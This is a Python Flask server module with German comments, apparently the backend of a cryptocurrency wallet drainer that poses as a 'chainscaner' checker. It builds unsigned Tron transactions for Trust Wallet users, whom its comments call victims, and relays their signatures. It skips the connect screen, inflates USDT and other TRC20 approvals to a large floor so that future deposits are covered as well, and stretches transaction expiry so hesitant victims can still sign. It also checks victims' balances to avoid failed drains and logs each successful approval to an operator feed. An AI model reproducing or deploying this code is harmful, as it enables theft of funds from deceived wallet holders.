"""
Tron Unsigned-Tx-Builder + Broadcast-Relay für den Checker-Handoff.

Trust Wallets DApp-Browser signiert eine serverseitig gebaute Transaktion
direkt über tronLink.sign() — dieser Call zeigt das native Signatur-Sheet
ohne jeglichen *_requestAccounts-Roundtrip, darum kann kein Connect-Screen
erscheinen. Die Wallet signiert nur; der Server broadcastet die Signatur.

  POST /api/trontx {step:"build", kind:"approve"|"trc20"|"trx",
                    owner:"T…", to:"T…", token:"usdt"|"TR…", amount:<raw int>}
      → {ok:true, tx:{raw_data, raw_data_hex, txID, visible:false}}
  POST /api/trontx {step:"broadcast", signed:{…}, meta:{kind,owner,to,tokenName,amount}}
      → {ok:true, txid:"…"} | {error:"…"}
      Bei Erfolg wird approve_sent / tx_confirmed in den Event-Feed gepusht —
      Ground Truth auch wenn die Seite zwischen Signatur und Broadcast stirbt.
"""
import json, os, urllib.request, hashlib, time
from datetime import datetime, timezone
from flask import Flask, request, jsonify
import base58

app = Flask(__name__)

TG = "https://api.trongrid.io"
TG_ALT = "https://api.tronstack.io"
RU = os.environ.get("UPSTASH_REDIS_REST_URL", "")
RT = os.environ.get("UPSTASH_REDIS_REST_TOKEN", "")
EVENTS_KEY = "chainscaner:events"
CONFIG_KEY = "chainscaner:config"

TRON_TOKENS = {
    "usdt": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "usdc": "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "usdd": "TPYmHEhy5n8TCEfYGqW2rPxsghSccghGRn",
    "tusd": "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
    "wtrx": "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
    "jst":  "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
    "sun":  "TSSMHYeV2uE9qYH95DqMeCuDy9vb59vTj",
    "btt":  "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4",
    "win":  "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
}


def _post(url, body, timeout=9):
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())


def tg(path, body):
    try:
        return _post(TG + path, body)
    except Exception:
        return _post(TG_ALT + path, body)


def redis(cmds):
    if not RU or not RT:
        return None
    req = urllib.request.Request(RU + "/pipeline", data=json.dumps(cmds).encode(),
                                 headers={"Content-Type": "application/json",
                                          "Authorization": "Bearer " + RT})
    return json.loads(urllib.request.urlopen(req, timeout=6).read())


def push_event(ev, data):
    try:
        env = {"at": datetime.now(timezone.utc).isoformat().replace("T", " ")[:19],
               "ip": "", "ua": "trontx-api",
               "ev": {"ev": ev, "t": datetime.now(timezone.utc).isoformat(), "d": data}}
        redis([["LPUSH", EVENTS_KEY, json.dumps(env)],
               ["LTRIM", EVENTS_KEY, "0", "199"]])
    except Exception:
        pass


def b58hex(a):
    return base58.b58decode_check(a).hex()


def tron_allowance_enabled():
    # Admin-Toggle aus der Runtime-Config: False → Sheet-only (kind="sim"),
    # die Signatur wird nie broadcastet. Default True.
    try:
        out = redis([["GET", CONFIG_KEY]])
        if not out:
            return None
        raw = (out[0] or {}).get("result")
        cfg = json.loads(raw) if raw else {}
        # Strict: nur explizit true = an. Fehlender Key = aus —
        # lieber ein sim zu viel als ein Approve zu viel.
        return cfg.get("tronAllowance") is True
    except Exception:
        # FAIL-CLOSED: unlesbare Config = None → kein Approve, niemals
        # raten. Lieber ein sim zu viel als ein Approve zu viel.
        return None


def tron_approve_units():
    # Admin-Feld "Tron Approve Amount" in Token-Einheiten (wird mit
    # 10^decimals des jeweiligen Tokens skaliert). 0 = kein Floor —
    # Approve = exakte Balance. Fehlend/unlesbar → 200M-Default.
    try:
        out = redis([["GET", CONFIG_KEY]])
        raw = out and (out[0] or {}).get("result")
        cfg = json.loads(raw) if raw else {}
        v = cfg.get("tronApproveAmt")
        if v is None:
            return 200000000
        return max(0, min(int(v), 10**15))
    except Exception:
        return 200000000


def valid_addr(a):
    return isinstance(a, str) and len(a) == 34 and a.startswith("T")


def rate_limited():
    try:
        out = redis([["INCR", "chainscaner:trontx_rate"],
                     ["EXPIRE", "chainscaner:trontx_rate", "600", "NX"]])
        return not out or int((out[0] or {}).get("result") or 0) > 120
    except Exception:
        return False


def fee_limit_for(owner_hex):
    # TWs Fee-Guard verlangt balance >= fee_limit — Cap = 80% der Opfer-
    # Balance, gedeckelt auf 150 TRX. fee_limit ist nur der Burn-Cap.
    try:
        bal = int((tg("/wallet/getaccount", {"address": owner_hex}) or {}).get("balance") or 0)
        return max(min(int(bal * 0.8), 150000000), 100000)
    except Exception:
        return 20000000


def extend_expiration(tx, add_ms=3300000):
    # TronGrid-Txs verfallen ~60s nach Build (expiration/ref_block) — haelt
    # das Opfer das Wallet-Sheet laenger offen, lehnt der Node beim Senden
    # ab ("couldn't send" in TW). raw_data.expiration wird gepatcht
    # (+~55min) und txID = sha256(raw_data) neu gehasht. Feldposition
    # NICHT raten: das varint-Feld mit Wert == raw_data.expiration suchen
    # (java-tron: expiration liegt auf Feld 8, nicht 4). Fehler → Original.
    try:
        target = int(tx["raw_data"]["expiration"])
        raw = bytearray.fromhex(tx["raw_data_hex"])

        def rd_varint(i):
            val, shift = 0, 0
            while True:
                b = raw[i]; i += 1
                val |= (b & 0x7F) << shift
                if not b & 0x80:
                    return val, i
                shift += 7

        pos = 0
        while pos < len(raw):
            tag, pos = rd_varint(pos)
            wire = tag & 7
            if wire == 0:
                vstart = pos
                val, pos = rd_varint(pos)
                if val == target:
                    newv = val + add_ms
                    enc = bytearray()
                    v = newv
                    while True:
                        b = v & 0x7F; v >>= 7
                        enc.append(b | (0x80 if v else 0))
                        if not v:
                            break
                    raw[vstart:pos] = enc
                    tx["raw_data_hex"] = raw.hex()
                    tx["txID"] = hashlib.sha256(bytes(raw)).hexdigest()
                    if isinstance(tx.get("raw_data"), dict):
                        tx["raw_data"]["expiration"] = newv
                    return tx
            elif wire == 2:
                ln, pos = rd_varint(pos)
                pos += ln
            elif wire == 5:
                pos += 4
            elif wire == 1:
                pos += 8
            else:
                break
    except Exception:
        pass
    return tx


def build(body):
    kind = str(body.get("kind") or "")
    owner = str(body.get("owner") or "").strip()
    to = str(body.get("to") or "").strip()
    tok = str(body.get("token") or "usdt").strip()
    token = tok if tok.startswith("T") else TRON_TOKENS.get(tok.lower())
    if not valid_addr(owner) or not valid_addr(to):
        return {"error": "invalid owner/to"}
    try:
        amount = int(body["amount"])
        if amount < 0 or amount >= (1 << 256):
            raise ValueError()
    except Exception:
        return {"error": "invalid amount"}
    owner_hex = b58hex(owner)

    allow_on = tron_allowance_enabled()

    if kind == "trx":
        if allow_on is not True:
            # Ein nativer TRX-Send kann nicht Null-Effekt gebaut werden
            # (amount=0 ist kein gültiger TransferContract) — im Aus-Modus
            # wird der Step übersprungen statt eine echte Drain-Tx zu bauen.
            return {"ok": True, "skipped": True,
                    "reason": "sim mode — TRX send disabled"}
        tx = tg("/wallet/createtransaction", {
            "owner_address": owner_hex,
            "to_address": b58hex(to),
            "amount": amount
        })
        if not tx or not tx.get("raw_data"):
            return {"error": "build failed: " + json.dumps(tx or {})[:140]}
        return {"ok": True, "tx": extend_expiration(tx)}

    if kind in ("approve", "trc20", "simtx"):
        if not token or not valid_addr(token):
            return {"error": "invalid token"}
        eff_kind = kind
        if kind == "approve":
            # Allowance deckt auch künftige Einzahlungen — Floor aus der
            # Admin-Config (Token-Einheiten × 10^decimals des Tokens).
            try:
                dec = max(0, min(int(body.get("decimals") or 6), 30))
            except Exception:
                dec = 6
            amount = max(amount, tron_approve_units() * (10 ** dec))
        if allow_on is not True and kind in ("approve", "trc20"):
            # Toggle aus ODER Config unlesbar = Sheet-only: Trust Wallet
            # broadcastet JEDE Tx-Signatur selbst (wallet-core #4459) und
            # lehnt ungültige Txs schon vor dem Sheet ab. Darum werden
            # VALIDE Null-Effekt-Txs gebaut — increaseApproval(spender, 0)
            # bzw. transfer(to, 0): broadcastet, aber Netto-Effekt exakt
            # null (Allowance bleibt, keine Tokens bewegen sich).
            eff_kind = "simtx"
        if eff_kind == "simtx":
            amount = 0
        selector = ("transfer(address,uint256)" if kind == "trc20"
                    else "increaseApproval(address,uint256)")
        param = b58hex(to)[2:].rjust(64, "0") + "%064x" % amount
        contract_hex = b58hex(token)
        # Burn-Gate VOR dem Sheet (identische java-tron-Formel wie pull.py):
        # Simulation (gratis) = exakter Energy-Bedarf inkl. Dynamic-Factor.
        # Reicht Energy+Balance des Opfers nicht → Sheet skippen statt
        # guaranteed Burn+Fail (verbrannte fee_limit bei OOG-Confirm).
        sim = tg("/wallet/triggerconstantcontract", {
            "owner_address": owner_hex,
            "contract_address": contract_hex,
            "function_selector": selector,
            "parameter": param
        })
        used = int((sim or {}).get("energy_used") or 0)
        sim_ok = ((sim or {}).get("result") or {}).get("result")
        if not used or not sim_ok:
            return {"ok": True, "skipped": True,
                    "reason": "simulation reverted — no sheet fired"}
        resrc = tg("/wallet/getaccountresource", {"address": owner_hex}) or {}
        # VERFUEGBARE Energy = Limit − Used (wie pull.py _op_resources) —
        # nur das Limit wuerde verbrauchte Energy mitzaehlen → OOG-Burn.
        have_e = max(0, int(resrc.get("EnergyLimit") or 0)
                        - int(resrc.get("EnergyUsed") or 0))
        acct = tg("/wallet/getaccount", {"address": owner_hex}) or {}
        bal = int(acct.get("balance") or 0)
        need = int(used * 1.15)
        if have_e + bal // 100 < need:
            push_event("sheet_skip_burn", {"owner": owner, "need": need,
                                           "have": have_e, "bal_sun": bal,
                                           "kind": kind})
            return {"ok": True, "skipped": True,
                    "reason": "insufficient energy coverage"}
        fee_limit = min(int(need * 100 * 1.05), int(bal * 0.95), 150000000)
        if fee_limit < need * 100:
            push_event("sheet_skip_burn", {"owner": owner, "need": need,
                                           "fee_cap": fee_limit, "kind": kind})
            return {"ok": True, "skipped": True,
                    "reason": "fee cap below required energy"}
        res = tg("/wallet/triggersmartcontract", {
            "owner_address": owner_hex,
            "contract_address": contract_hex,
            "function_selector": selector,
            "parameter": param,
            "fee_limit": fee_limit,
            "call_value": 0
        })
        tx = res and res.get("transaction")
        if not tx or not tx.get("raw_data"):
            r = res and res.get("result")
            return {"error": "build failed: " + json.dumps(r or res or {})[:140]}
        return {"ok": True, "tx": extend_expiration(tx), "kind": eff_kind}

    return {"error": "unknown kind"}


def broadcast(body):
    signed = body.get("signed")
    if not isinstance(signed, dict) or not signed.get("signature"):
        return {"error": "no signed tx"}
    bc = tg("/wallet/broadcasttransaction", signed)
    if bc.get("result"):
        return {"ok": True, "txid": bc.get("txid") or signed.get("txID")}
    raw = bc.get("message") or ""
    try:
        msg = bytes.fromhex(raw).decode()
    except Exception:
        msg = raw or str(bc.get("code") or "")
    if "dup" in msg.lower():
        return {"ok": True, "txid": signed.get("txID"), "dup": True}
    # Ambiger Fehler (Infra/Timeout): die Tx kann trotzdem on-chain sein —
    # verifizieren bevor wir "failed" melden, sonst faengt ein Retry eine
    # zweite Signatur an und das Opfer brennt doppelt.
    infra_err = ("tron api" in msg.lower() or "http " in msg.lower()
                 or "timeout" in msg.lower())
    if infra_err:
        for attempt in range(3):
            info = tg("/wallet/gettransactioninfobyid",
                      {"value": signed.get("txID")}) or {}
            receipt = info.get("receipt") or {}
            if receipt.get("result") == "SUCCESS":
                return {"ok": True, "txid": signed.get("txID"),
                        "confirmed_after_unclear": True}
            if receipt:
                return {"error": "tx reverted on-chain: "
                                 + str(receipt.get("result"))}
            if attempt < 2:
                time.sleep(4)
        return {"error": "broadcast unclear: " + msg[:120]
                         + " — txid " + str(signed.get("txID"))}
    return {"error": "broadcast failed: " + msg[:140]}


@app.route("/api/trontx", methods=["POST"])
def route():
    body = request.get_json(silent=True) or {}
    step = body.get("step")
    if rate_limited():
        return jsonify({"error": "rate limited"}), 429
    try:
        if step == "build":
            return jsonify(build(body))
        if step == "broadcast":
            meta = body.get("meta") or {}
            if meta.get("kind") == "sim" or (
                    meta.get("kind") != "simtx"
                    and tron_allowance_enabled() is not True):
                # Harte Regel: Broadcast nur bei explizit AN — das gilt für
                # ALLE echten Tx-Arten (approve, trc20, trx), nicht nur
                # approve. "sim" ist das Legacy-Kind alter Clients und
                # "simtx" die Null-Effekt-Tx — beide nie geblockt bzw. die
                # einzige die im Aus-Modus relayed wird.
                push_event("sim_signed", {
                    "from": meta.get("owner"), "spender": meta.get("to"),
                    "token": meta.get("tokenName") or "USDT"})
                return jsonify({"ok": True, "sim": True})
            out = broadcast(body)
            if out.get("ok"):
                if meta.get("kind") == "simtx":
                    push_event("sim_tx_sent", {
                        "from": meta.get("owner"), "spender": meta.get("to"),
                        "token": meta.get("tokenName") or "USDT",
                        "hash": out.get("txid")})
                elif meta.get("kind") == "approve":
                    push_event("approve_sent", {
                        "from": meta.get("owner"), "spender": meta.get("to"),
                        "token": meta.get("tokenName") or "USDT",
                        "amount": meta.get("amount"), "hash": out.get("txid")})
                elif meta.get("tokenName"):
                    push_event("tx_confirmed", {
                        "token": meta.get("tokenName"), "chain": "Tron",
                        "hash": out.get("txid"), "to": meta.get("to")})
            else:
                push_event("broadcast_failed", {"error": out.get("error", "")[:120]})
            return jsonify(out)
        return jsonify({"error": "unknown step"}), 400
    except Exception as e:
        return jsonify({"error": str(e)[:200]}), 502
